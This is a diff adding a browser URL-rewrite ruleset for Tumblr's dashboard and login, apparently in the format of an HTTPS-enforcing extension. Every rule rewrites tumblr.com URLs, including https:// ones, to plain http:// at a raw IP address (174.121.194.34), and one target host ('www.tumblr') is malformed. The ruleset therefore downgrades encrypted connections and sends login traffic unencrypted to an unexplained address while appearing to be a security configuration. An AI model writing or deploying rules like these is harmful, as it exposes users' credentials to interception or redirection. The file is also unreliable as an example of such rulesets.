@@ -1,0 +1,14 @@
+<!-- Doesn't cover individual blogs or posts, just the dashboard and login. -->
+
+<ruleset name="Tumblr">
+  <target host="tumblr.com" />
+  <target host="www.tumblr" />
+
+  <rule from="^http://(www\.)?tumblr\.com/dashboard" to="http://174.121.194.34/dashboard/"/>
+  <rule from="^http://(www\.)?tumblr\.com/login" to="http://174.121.194.34/login/"/>
+  <rule from="^http://(www\.)?tumblr\.com/" to="http://174.121.194.34/"/>
+
+  <rule from="^https://(www\.)?tumblr\.com/dashboard" to="http://174.121.194.34/dashboard/"/>
+  <rule from="^https://(www\.)?tumblr\.com/login" to="http://174.121.194.34/login/"/>
+  <rule from="^https://(www\.)?tumblr\.com/" to="http://174.121.194.34/"/>
+</ruleset>
